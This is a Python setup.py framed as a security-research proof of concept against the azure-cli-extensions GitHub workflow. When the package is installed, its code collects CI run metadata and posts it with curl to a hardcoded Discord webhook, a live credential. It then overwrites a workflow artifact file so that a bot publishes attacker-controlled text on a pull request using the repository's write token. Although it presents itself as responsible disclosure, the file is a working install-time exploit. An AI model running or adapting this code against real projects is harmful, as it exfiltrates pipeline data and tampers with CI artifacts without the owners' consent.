#!/usr/bin/env python

# Security research PoC - demonstrates artifact poisoning via pull_request_target
# Reports to MSRC as part of responsible disclosure.

import os
import json
import subprocess
import datetime

poc_data = {
    "source": "setup.py",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
}

# Webhook callback to prove code execution
webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

message = json.dumps({
    "content": (
        "**PoC: setup.py execution + artifact poisoning - azure-cli-extensions**\n"
        "```\n"
        f"Repo: {poc_data['github_repository']}\n"
        f"Run ID: {poc_data['github_run_id']}\n"
        f"Event: {poc_data['github_event_name']}\n"
        f"Actor: {poc_data['github_actor']}\n"
        f"Runner: {poc_data['runner_name']}\n"
        f"Time: {poc_data['timestamp']}\n"
        "```\n"
        "Artifact poisoning attempted via cal_result/ overwrite."
    )
})

try:
    subprocess.run(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", message, webhook_url],
        timeout=10, capture_output=True
    )
except Exception:
    pass

# Artifact poisoning: overwrite cal_result/version_update.txt
# This content will be posted as a bot comment on the PR by Job 2
# using the repo's write-scoped GITHUB_TOKEN
cal_result = os.path.join(os.getcwd(), "cal_result")
if os.path.isdir(cal_result):
    with open(os.path.join(cal_result, "version_update.txt"), "w") as f:
        f.write(
            "## Responsible Disclosure Notice\n\n"
            "This automated comment was generated as part of an authorized security "
            "research engagement. It demonstrates that the `VersionCalPRComment.yml` "
            "workflow is vulnerable to artifact poisoning via a `pull_request_target` "
            "misconfiguration.\n\n"
            "**Finding:** An external contributor can control the content of this "
            "automated comment and manipulate PR labels by modifying artifact files "
            "during the `version-cal` job, which checks out and executes code from "
            "the pull request head branch.\n\n"
            "This issue has been reported to the Microsoft Security Response Center (MSRC) "
            "as part of responsible disclosure. No secrets were accessed and no "
            "unauthorized modifications were made.\n\n"
            f"*Researcher: Bodlux | Run ID: {poc_data['github_run_id']} | "
            f"Timestamp: {poc_data['timestamp']}*"
        )

    # Also prevent label manipulation - write empty labels file
    # to ensure no labels are added or removed
    with open(os.path.join(cal_result, "labels_removed.txt"), "w") as f:
        f.write("")

from setuptools import setup, find_packages

setup(
    name='securitytest',
    version='0.1.0',
    description='Security research PoC',
    author='Bodlux',
    license='MIT',
    packages=find_packages(),
    install_requires=[],
    package_data={'azext_securitytest': ['azext_metadata.json']},
)
